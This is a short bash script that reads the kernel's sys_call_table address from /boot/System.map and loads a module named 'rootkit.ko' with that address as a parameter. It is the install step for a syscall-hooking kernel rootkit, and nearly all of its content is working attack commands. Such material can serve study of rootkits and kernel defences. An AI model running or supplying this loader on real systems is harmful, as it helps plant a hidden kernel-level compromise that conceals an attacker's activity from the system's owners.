#!/bin/bash

#Find the sys_call_table symbol's address from the /boot/System.map

TABLE_ADDR=`cut -d ' ' -f1 <<< $(sudo cat /boot/System.map-$(uname -r) | grep " sys_call_table")`

#Insert the rootkit module, providing some parameters
insmod rootkit.ko table_addr=0x$TABLE_ADDR
